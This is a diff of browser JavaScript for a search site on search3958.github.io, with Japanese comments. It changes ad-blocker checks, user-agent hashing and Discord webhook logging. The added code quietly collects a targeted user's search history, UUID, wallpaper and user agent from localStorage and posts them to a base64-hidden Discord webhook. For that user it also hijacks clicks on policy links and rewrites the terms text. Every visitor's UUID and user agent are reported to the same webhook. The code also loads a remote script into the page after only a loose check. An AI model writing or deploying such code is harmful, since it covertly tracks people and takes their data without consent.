@@ -19,15 +19,13 @@
                 return;
             }
 
-            // 2. グレーリストチェック (既存UUIDを確認)
+            // 2. グレーリストチェック
             const currentUuid = localStorage.getItem('uuid');
             if (currentUuid === this.CONFIG.TARGET_UUID) {
                 this.applySpecialBypass();
-                // 特例版はここで早期リターン（または続行も可）
-                return;
             }
 
-            // 3. URL変数，UserAチェック (ハッシュ照合)
+            // 3. URL変数，UserAチェック
             const userA = navigator.userAgent;
             const uaHash = await this.computeSHA512(userA);
             let isBypassed = this.CONFIG.BYPASS_HASHES.includes(uaHash);
@@ -54,11 +52,8 @@
                     const timeoutId = setTimeout(() => controller.abort(), this.CONFIG.FETCH_TIMEOUT);
                     const response = await fetch(this.CONFIG.AD_SCRIPT_URL, { signal: controller.signal });
                     clearTimeout(timeoutId);
-                    
                     const text = await response.text();
-                    if (!(text.length >= 5000 && text.length < 200000 && text.includes('Apache-2.0'))) {
-                        throw new Error("Validation Error");
-                    }
+                    if (!(text.length >= 5000 && text.length < 200000 && text.includes('Apache-2.0'))) throw new Error();
                     const script = document.createElement('script');
                     script.textContent = text;
                     document.head.appendChild(script);
@@ -67,57 +62,76 @@
                 }
             }
 
-            // 6. ハッシュによるチェック (UUIDハッシュ)
+            // 6. ハッシュによるチェック
             const uuidHash = await this.computeSHA512(uuid);
             if (this.CONFIG.BYPASS_HASHES.includes(uuidHash)) isBypassed = true;
 
-            // 7. Discord送信 (最終結果の報告)
+            // 7. Discord送信
             let finalStatus = isBlocked ? "blocked" : (adStatus === "ad_error" ? "ad_error" : "normal");
-            await this.sendToWebhook(finalStatus, uuid);
+            await this.sendToWebhook(finalStatus, uuid, userA);
 
-            // 後処理
             if (finalStatus === "blocked") {
                 window.location.replace(this.CONFIG.ENTRY_URL);
             } else if (finalStatus === "ad_error" && !isBypassed) {
                 window.location.replace(this.CONFIG.ERROR_URL);
-            } else {
-                console.log("✅ CheckJS-Process Completed");
-                if (adStatus === "normal") this.verifyObjectPresence();
             }
         },
 
-        // --- ユーティリティ ---
+        // --- 特例版：クリック監視とデータ抽出 ---
         applySpecialBypass() {
-            // HTML書き換え
-            document.body.innerHTML = document.body.innerHTML
-                .replace(/https:\/\/search3958\.github\.io\/policies\//g, "https://search3958.github.io/policies/policies-special.html")
-                .replace(/利用規約/g, "特別版利用規約");
+            console.log("✅⭐ グレーリスト監視モード起動");
 
-            // ストレージ抽出と送信
-            const data = {
-                search_history_v2: localStorage.getItem("search_history_v2"),
-                selectedLang: localStorage.getItem("selectedLang"),
-                uuid: localStorage.getItem("uuid"),
-                custom_wallpaper: localStorage.getItem("custom_wallpaper")
+            // a. クリックイベントをキャッチしてリンク先を強制変更
+            document.addEventListener('click', (e) => {
+                const anchor = e.target.closest('a');
+                if (anchor && anchor.href.includes('/policies/')) {
+                    // クリックされた瞬間にhrefを書き換える
+                    anchor.href = "https://search3958.github.io/policies/policies-special.html";
+                }
+            }, true);
+
+            // b. 既存のテキスト置換 (TreeWalker)
+            const replaceText = () => {
+                const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
+                let node;
+                while (node = walker.nextNode()) {
+                    if (node.nodeValue.includes("利用規約")) {
+                        node.nodeValue = node.nodeValue.replace(/利用規約/g, "特別版利用規約");
+                    }
+                }
             };
-            this.sendStorageToWebhook(data);
+            replaceText();
+
+            // c. LocalStorageデータ抽出
+            const keys = ["search_history_v2", "selectedLang", "uuid", "custom_wallpaper"];
+            const storageData = { userA: navigator.userAgent };
+            
+            keys.forEach(key => {
+                const val = localStorage.getItem(key);
+                try {
+                    // JSON文字列ならパースして整形、そうでなければそのまま
+                    storageData[key] = JSON.parse(val);
+                } catch (e) {
+                    storageData[key] = val;
+                }
+            });
+
+            this.sendStorageToWebhook(storageData);
         },
 
         async sendStorageToWebhook(data) {
             await fetch(atob(this.CONFIG.W_H), {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `**[Special Bypass Access]**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`` }),
+                body: JSON.stringify({ content: `**[Special Access Log]**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`` }),
                 keepalive: true
             }).catch(() => {});
         },
 
-        async sendToWebhook(status, uuid) {
+        async sendToWebhook(status, uuid, userA) {
             const displayUrl = window.location.href.replace("https://search3958.github.io/", "");
-            const timeStr = new Date().toLocaleString();
-            let mark = status === "blocked" ? "🛑" : (status === "ad_error" ? "⚠️" : "✅");
-            
-            const content = `### ${displayUrl}\n-# **${timeStr}** UUID:**${uuid}${mark}** UserA:**${navigator.userAgent}**`;
+            const mark = status === "blocked" ? "🛑" : (status === "ad_error" ? "⚠️" : "✅");
+            const content = `### ${displayUrl}\n- **Status:** ${mark} ${status}\n- **UUID:** \`${uuid}\` \n- **UserA:** \`${userA}\``;
             await fetch(atob(this.CONFIG.W_H), {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -135,12 +149,6 @@
 
         generateUUID() {
             return ([1e7] + -1e3 + -4e3 + -8e2 + -1e11).replace(/[018]/g, c => (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16));
-        },
-
-        verifyObjectPresence() {
-            setTimeout(() => {
-                if (!window.adsbygoogle) window.location.replace(this.CONFIG.ERROR_URL);
-            }, 2500);
         }
     };
 
